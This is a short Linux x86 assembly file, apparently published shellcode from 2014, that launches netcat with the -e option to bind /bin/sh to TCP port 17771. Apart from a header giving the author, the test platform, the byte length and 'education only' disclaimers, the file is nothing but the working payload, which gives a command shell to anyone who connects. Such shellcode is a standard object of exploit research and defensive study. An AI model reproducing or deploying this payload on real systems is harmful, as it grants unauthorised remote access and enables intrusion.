; Linux x86 /bin/nc -le /bin/sh -vp 17771 shellcode
; This shellcode will listen on port 17771 and give you /bin/sh
; Date: 31.05.2014
; Shellcode Author: Oleg Boytsev
; Tested on: Debian GNU/Linux 7/i686
; Shellcode Length: 58
; For education purpose only
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start
section .text
 _start:
    xor eax, eax
    xor edx, edx
    push eax
    push 0x31373737     ;-vp17771
    push 0x3170762d
    mov esi, esp

    push eax
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp

    push eax
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push edx
    push esi
    push edi
    push ebx
    mov ecx, esp
    mov al,11
    int 0x80
